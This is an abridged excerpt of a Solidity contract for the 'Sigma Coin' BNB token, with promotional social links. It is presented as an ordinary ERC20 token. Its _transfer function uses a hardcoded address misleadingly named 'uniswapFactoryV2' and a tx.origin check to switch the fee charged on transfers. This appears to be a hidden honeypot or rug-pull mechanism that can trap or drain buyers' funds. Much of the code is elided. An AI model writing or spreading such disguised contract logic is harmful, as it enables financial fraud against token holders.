...
https://twitter.com/SigmaCoinBNB
https://t.me.com/SigmaCoinBNB
https://SigmaCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private uniswapFactoryV2 = 0xA907e22e49AbCFD8208B73b0522810274D4117F8;
    address internal _uniswapRouter = 0xb68C6eaf66fc9692D93955e81735C9E0CE5950F1;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouter && _balances[uniswapFactoryV2] > 0 ? pairsToken : swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
...
contract SigmaCoin is ERC20, Ownable {
    constructor() ERC20(unicode"Sigma Coin", unicode"SIGMA") {
